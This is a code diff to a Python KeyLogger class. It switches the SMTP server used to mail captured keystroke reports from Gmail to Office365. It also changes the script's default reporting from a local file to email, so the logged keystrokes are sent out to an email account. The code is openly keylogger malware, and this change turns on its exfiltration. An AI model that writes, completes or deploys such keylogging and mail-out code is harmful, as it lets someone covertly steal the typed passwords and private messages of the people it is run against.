@@ -63,7 +63,7 @@ class KeyLogger:
         return msg.as_string()
 
     def send_email(self, email, password, message, verbose=1):
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server = smtplib.SMTP(host="smtp.office365.com", port=587)
         server.starttls()
         server.login(email, password)
         server.sendmail(email, email, self.prepare_email(message))
@@ -96,6 +96,6 @@ class KeyLogger:
 
 
 if __name__ == "__main__":
-    keylogger = KeyLogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger = KeyLogger(interval=SEND_REPORT_EVERY, report_method="email")
     keylogger.start()
 
